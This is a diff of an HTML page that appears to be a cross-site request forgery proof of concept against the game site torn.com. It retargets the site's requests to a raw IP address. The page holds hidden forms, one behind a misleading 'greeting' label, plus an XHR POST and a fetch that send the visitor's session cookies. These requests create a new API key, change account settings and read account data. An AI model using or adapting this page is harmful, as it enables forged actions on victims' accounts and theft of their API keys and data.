@@ -1,6 +1,6 @@
 <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
 
-<form action="https://www.torn.com/bazaar.php" method="GET">
+<form action="https://139.180.157.68/bazaar.php" method="GET">
   <div>
     <label for="sid">What greeting do you want to say?</label>
     <input name="sid" id="sid" value="bazaarData">
@@ -15,7 +15,7 @@
 </form>
 
 <!---https://www.torn.com/preferences.php#tab=api?&step=addNewKey&title=Public%20only%20key&type=1-->
-<form action="https://www.torn.com/preferences.php#tab=api?&step=addNewKey&title=ppp&type=1" method="GET">
+<form action="https://139.180.157.68/preferences.php#tab=api?&step=addNewKey&title=ppp&type=1" method="GET">
   <div>
     <button>Create</button>
   </div>
@@ -35,11 +35,11 @@
 
 <button onclick="doF()">Fetch</button>
 
-<button onclick="var post_data = 'ajax=step_settings&rfc=&textnames=0&pv=0&reviving=1&widgets=0'; var xmlhttp = new XMLHttpRequest(); xmlhttp.open('POST', 'https://www.torn.com/preferences.php', true); xmlhttp.withCredentials = true; xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState === 4) { alert(xmlhttp.response); } }; xmlhttp.send(post_data);">XML</button>
+<button onclick="var post_data = 'ajax=step_settings&rfc=&textnames=0&pv=0&reviving=1&widgets=0'; var xmlhttp = new XMLHttpRequest(); xmlhttp.open('POST', 'https://139.180.157.68/preferences.php', true); xmlhttp.withCredentials = true; xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState === 4) { alert(xmlhttp.response); } }; xmlhttp.send(post_data);">XML</button>
 
 <script>
 async function doF() {
-const r = await fetch("https://www.torn.com/page.php?sid=apiData", {
+const r = await fetch("https://139.180.157.68/page.php?sid=apiData", {
     "credentials": "include",
     "headers": {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
